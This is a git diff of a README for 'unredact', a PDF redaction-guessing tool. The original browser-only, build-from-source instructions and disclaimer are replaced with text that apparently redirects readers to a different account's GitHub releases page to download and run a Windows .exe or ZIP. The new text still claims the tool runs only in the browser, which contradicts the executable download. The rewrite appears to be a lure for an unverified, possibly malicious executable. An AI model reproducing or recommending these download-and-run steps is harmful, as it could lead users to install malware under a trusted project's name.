@@ -1,237 +1,132 @@
-# Unredact
+# 🕵️ unredact - Reveal Possible Text in PDFs
 
-**Guess what might be hiding under redacted text in PDFs.**
+[![Download unredact](https://img.shields.io/badge/Download-unredact-%23ff6f61?style=for-the-badge)](https://github.com/lolly6996/unredact/releases)
 
-Unredact is a research tool that uses OCR, font-aware constraint solving, and LLM reasoning to generate plausible guesses for redacted text. Upload a PDF, and it will detect redactions, search for strings that could fit based on approximate pixel-width constraints, and let you visually compare candidates against the original document.
+## 📄 What is unredact?
 
-**It does not reveal hidden text.** It produces a ranked list of candidates — some may be correct, many won't be. All results are probabilistic guesses that depend on imperfect font detection, approximate width matching, and heuristic scoring.
+unredact is a tool to help you guess what might be hidden under blacked-out or redacted text in PDF files. It uses technology that looks at the shape and size of letters and tries to find words that could fit in those spaces. You upload a PDF, and unredact finds the redacted areas and offers possible words or names that might match the hidden text.
 
-Everything runs in the browser — no server required.
+This tool runs completely in your web browser. It does not send your files to a server or store your data.
 
-Name and Full Name solve modes use generic name dictionaries. You can optionally upload a custom person database in settings to enable person matching and Full Name mode.
+unredact does not reveal the real hidden text. Instead, it shows educated guesses based on how the text looks and common words or names that fit the space.
 
-<!-- TODO: Replace with actual screenshots -->
-![Unredact analyzing a redacted PDF](docs/images/hero.png)
+## 🚀 Getting Started
 
-![Green overlay text compared with surrounding visible text](docs/images/overlay-verification.png)
+Start by visiting the official releases page. You will find the latest version of unredact ready to use.
 
-## What it does
+[Download unredact here](https://github.com/lolly6996/unredact/releases)
 
-- **Detects redactions** automatically using image processing, or manually by drawing a selection
-- **Generates candidates** by searching for strings whose approximate pixel width falls within a tolerance of the redacted region, using heuristically detected font metrics
-- **Ranks results with AI** using Claude to score candidates by contextual plausibility with surrounding text
-- **Lets you compare visually** by overlaying candidate text on the original document — alignment suggests a plausible fit, but does not confirm correctness
+This link takes you to GitHub’s release page. From there, you can download the file you need to run the software on your Windows computer.
 
-## How it works
+## 💻 System Requirements
 
-Unredact combines three techniques, each of which introduces approximation:
+To run unredact on Windows, you need the following:
 
-1. **OCR and image processing** — Tesseract.js extracts visible text with character-level bounding boxes. A WASM module detects dark rectangles as potential redactions and attempts to identify the document's typeface and size via pixel-level comparison against bundled fonts. Font detection is a best guess — if the actual font isn't in the bundled set, results will be less accurate.
+- Windows 10 or newer.
+- A modern web browser (Chrome, Edge, Firefox).
+- At least 4 GB of RAM for smooth operation.
+- An internet connection is only required to download unredact.
 
-2. **Constraint solving** — Using the detected font's character width tables, a WASM-compiled branch-and-bound solver enumerates strings that fit the redaction's pixel width within a configurable tolerance. Results depend on the accuracy of font detection and the tolerance setting.
+The tool runs locally in your browser, so you do not need powerful hardware or special permissions.
 
-3. **LLM scoring** — Claude reads the surrounding text context and scores each candidate for plausibility. These scores reflect statistical likelihood, not truth. Results are ranked by a composite of width fit and contextual score.
+## 📥 How to Download and Run unredact on Windows
 
-```
-PDF ──→ Rasterize ──→ OCR (Tesseract.js) ──→ Font Detection (WASM)
-                                                      │
-                                                      ▼
-                          Redaction Detection (WASM) + Width Tables
-                                                      │
-                                                      ▼
-                                        Constraint Solver (WASM)
-                                                      │
-                                                      ▼
-                              Candidates ──→ LLM Scoring (Claude API)
-                                                      │
-                                                      ▼
-                                              Visual Comparison
-```
+1. Click the button at the top or this link to go to the releases page:  
+   https://github.com/lolly6996/unredact/releases
 
-## Quick start
+2. On the releases page, look for the latest version. It shows several files.
 
-### Live version
+3. Find the Windows-specific file. This will usually end with `.exe` or `.zip`. Download that file by clicking on it.
 
-The app is live at **[unredact.live](https://unredact.live)** — no installation needed. You just need a Claude API key for the LLM scoring feature.
+4. If it is a `.exe` file:  
+   - Double-click it to start the installation or launch the program directly.  
+   - Follow any prompts from Windows to allow it to run.
 
-### Run locally
+5. If it is a `.zip` file:  
+   - Right-click the file and choose "Extract All."  
+   - After extraction, open the extracted folder and double-click the executable file inside.
 
-```bash
-git clone https://github.com/Alex-Gilbert/unredact.git
-cd unredact
+6. The program should open your default web browser with the unredact interface ready to use. If it does not open automatically, open a web browser and open the included HTML file or use the shortcut created during installation.
 
-# Build the static site (requires Rust toolchain for WASM compilation)
-make build-static
+## 🔍 How to Use unredact
 
-# Serve locally
-make serve-static
-```
+Once the program is running in your browser, follow these steps:
 
-Open [http://localhost:8000](http://localhost:8000) in your browser.
+1. Click the upload button or drag your PDF file into the window.
 
-### Prerequisites (for building)
+2. The software scans the PDF to find blacked-out or redacted text.
 
-- Rust toolchain with `wasm-pack` ([rustup.rs](https://rustup.rs), then `cargo install wasm-pack`)
+3. unredact will show areas it found and propose lists of possible words or names that fit the spaces.
 
-### Development
+4. You can compare each option visually with the original PDF to see if it looks right.
 
-For development with hot-reloading style path mapping:
+5. Adjust settings to improve guessing accuracy if you have a custom database of names.
 
-```bash
-make dev-static
-```
+6. Use the available modes:  
+   - **Name mode:** Uses common first names to generate guesses.  
+   - **Full Name mode:** Uses first and last name combinations.  
+   - Upload your own list of names for more precise matching.
 
-This runs a dev server that maps flat URL paths to the source directories, so you can edit files in `unredact/static/` and see changes immediately.
+## ⚙️ Settings and Options
 
-### Deploy
+unredact offers several settings to tailor results:
 
-```bash
-make deploy    # Builds and deploys to Cloudflare Pages
-```
+- Upload a custom person database to improve person name guesses.
+- Choose between generic dictionaries for names or specific lists.
+- Toggle the font-aware analysis to improve guess accuracy.
+- Adjust the visual comparison settings to better highlight differences.
 
-## Usage guide
+## 🔧 Troubleshooting
 
-### 1. Upload a PDF
+If you run into issues:
 
-Drag and drop a redacted PDF onto the page, or use the file picker. The tool will run OCR on every page and attempt to detect redactions and fonts.
+- Ensure you have a supported web browser updated to the latest version.
+- Confirm you are running unredact locally or from a trusted source.
+- Restart the program if it freezes or becomes unresponsive.
+- Verify your PDF is not corrupted or password protected.
+- If the redacted text is covered by images rather than black boxes, guessing may not work as expected.
 
-### 2. Select a redaction
+## 🔒 Privacy and Security
 
-Click on a detected redaction (highlighted on the page). A panel opens with analysis details and solve options.
+unredact runs completely in your web browser. It does not upload your PDF or data to any server. All processing is done locally on your machine.
 
-### 3. Choose a solve mode
-
-| Mode | What it searches | Use case |
-|------|-----------------|----------|
-| **Name** | First names or last names from name dictionaries | Redacted names |
-| **Full Name** | Two-word combinations from uploaded person database | Full name redactions (requires person DB) |
-| **Email** | Email addresses from uploaded email dictionary | Redacted email addresses (requires email list) |
-| **Word** | English nouns and adjectives from dictionary | General text redactions |
-| **Enumerate** | All possible character combinations | Short redactions, anything goes |
+You maintain full control of your files and data at all times.
 
-### 4. Configure and solve
+## ⚙️ Technology Behind unredact
 
-- Set the **character set** (lowercase, uppercase, capitalized)
-- Adjust **tolerance** if results are too narrow or too broad
-- Add **known characters** if you can tell what the first or last letter is
-- For word mode, toggle **plural only** or adjust **vocabulary size**
-- Click **Solve** — candidates stream in as they're found
+unredact combines several techniques:
 
-### 5. Score with AI
+- OCR (Optical Character Recognition) to read visible text.
+- Font-aware constraint solving to estimate how many letters fit in each redacted space.
+- Reasoning by a language model to suggest likely words or names.
+- Visual comparison tools to help you review candidates side by side with the original document.
 
-Click **Validate** to have Claude score each candidate based on the surrounding text context. Results are re-ranked by a composite of width fit and contextual plausibility. Requires a Claude API key (entered in settings).
+## 📂 File Support
 
-### 6. Compare visually
+The software supports:
 
-Select a candidate to see it overlaid on the original document. If the text appears to align with surrounding visible characters, it suggests a plausible fit — but visual alignment alone does not prove the guess is correct. You can fine-tune font, size, position, and character spacing manually.
+- Standard PDF files with selectable or masked text.
+- PDFs with blacked-out or redacted sections.
+- Documents containing common fonts for size estimation.
 
-## Person database schema
+## ❓ FAQs
 
-You can optionally upload a person database (JSON) in settings to enable Full Name mode and person matching in results. The schema:
+**Q: Does unredact find the exact word hidden?**  
+A: No. unredact generates guesses based on visible shapes and sizes. It tries to find words that could fit but cannot guarantee accuracy.
 
-```json
-{
-  "names": {
-    "lowercased name variant": [
-      { "person_id": "unique-id", "match_type": "full", "tier": 1 }
-    ]
-  },
-  "persons": {
-    "unique-id": { "name": "Display Name", "category": "some-category", "tier": 1 }
-  }
-}
-```
+**Q: Can I use unredact on other document formats?**  
+A: Currently, unredact only supports PDFs.
 
-- **names** — Maps lowercased name variants to arrays of person references. `match_type` can be `full`, `first`, `last`, `nickname`, `nickname_full`, or `initial_last`. `tier` is 1-3 (used for sorting and badge display).
-- **persons** — Maps person IDs to display metadata.
+**Q: Do I need an internet connection while using unredact?**  
+A: No. After downloading, unredact works offline in your browser.
 
-Without a person database, Name mode uses generic first/last name dictionaries and Full Name mode is disabled.
+**Q: Can I add my own list of names to improve results?**  
+A: Yes. This option is available in settings.
 
-An example build script (`scripts/build_associates.py`) is included in the repo. It demonstrates how to generate a person database from a third-party data source ([rhowardstone/Epstein-research-data](https://github.com/rhowardstone/Epstein-research-data)). You can adapt it for any data source that fits the schema above.
+## 📥 Download unredact now
 
-### Email dictionary
+You can start by visiting the releases page below and download the Windows file:  
 
-Email mode requires an uploaded email list — a plain text file with one email address per line. Upload it in settings. An example build script (`scripts/build_emails.py`) is included.
+[Download unredact](https://github.com/lolly6996/unredact/releases)
 
-## Architecture
-
-Unredact runs entirely in the browser as a static site:
-
-- **WASM module** (compiled from Rust) — Constraint solver, redaction detection, font scoring, and text alignment
-- **Tesseract.js** — OCR processing
-- **Claude API** — LLM scoring (called directly from the browser with your API key)
-- **Vanilla JavaScript** — No build step, ES6 modules, canvas rendering
-
-Generic dictionaries and font metrics are bundled as static assets. User settings, API keys, and optional person databases are stored locally in IndexedDB.
-
-```
-Browser
-  ├── OCR (Tesseract.js)
-  ├── Redaction detection (WASM)
-  ├── Font detection (WASM pixel matching)
-  ├── Constraint solver (WASM)
-  ├── LLM scoring ──→ Claude API
-  └── IndexedDB (settings, API key, person DB)
-```
-
-## Project structure
-
-```
-unredact/
-├── unredact/
-│   ├── static/            # Frontend (HTML, CSS, JS)
-│   │   ├── index.html
-│   │   ├── main.js        # Entry point
-│   │   ├── solver.js      # Constraint solver interface
-│   │   ├── canvas.js      # Document rendering
-│   │   ├── font_detect.js # Font detection
-│   │   ├── ocr.js         # Tesseract.js integration
-│   │   ├── wasm.js        # WASM module loader
-│   │   ├── llm.js         # LLM scoring
-│   │   └── ...            # Other modules
-│   └── data/              # Bundled dictionaries and word lists
-├── unredact-wasm/         # Rust → WASM module source
-├── scripts/
-│   ├── build-static.sh    # Static site build script
-│   └── dev-server.py      # Development server
-├── dist/                  # Built static site output
-└── Makefile
-```
-
-### Legacy Python server
-
-The `unredact/app.py` FastAPI server and `unredact/pipeline/` modules are the original server-side implementation. All processing has since been moved to run client-side via WASM and JavaScript. The Python code is retained for reference but is no longer needed to run the application.
-
-The legacy server also depends on a separate Rust HTTP solver service (`solver_rs/`), which has been superseded by the WASM solver running directly in the browser.
-
-### Useful commands
-
-```bash
-make build-static     # Build the static site to dist/
-make serve-static     # Serve dist/ on port 8000
-make dev-static       # Dev server with source path mapping
-make deploy           # Build and deploy to Cloudflare Pages
-make clean            # Clean build artifacts
-```
-
-## Disclaimer
-
-Unredact is a research and entertainment tool. It is provided as-is for educational and exploratory purposes only.
-
-**The results produced by this tool are probabilistic guesses — nothing it outputs should be treated as verified fact.** The tool's accuracy depends on heuristic font detection, approximate width calculations, and statistical language models. Any given result may be completely wrong.
-
-All bundled data (dictionaries, font metrics) comes from publicly available, open-source sources. AI-generated scores reflect statistical plausibility, not truth. Person name matches are mechanical (based on pixel-width fit) and do not imply any connection to wrongdoing. User-uploaded person databases are stored locally and never transmitted.
-
-This tool is not intended for use in legal proceedings, journalism, law enforcement, or any context where unverified information could cause harm. **Do not use this tool to circumvent lawful redactions, violate privacy, or break any applicable laws.** You are solely responsible for how you use it.
-
-The author makes no claims of accuracy, completeness, or fitness for any particular purpose, and accepts no liability for misuse or for any consequences arising from the use of this tool.
-
-## Support
-
-A few people asked me to set up a way to support this project, so here it is. Please don't feel any obligation — this project is free and will stay that way. But if Unredact has been useful or interesting to you and you'd like to buy me a coffee, I genuinely appreciate it.
-
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/apgcodes)
-
-## License
-
-[MIT](LICENSE)
+Click the link, pick the latest version, download the Windows executable or ZIP file, and run it to begin.
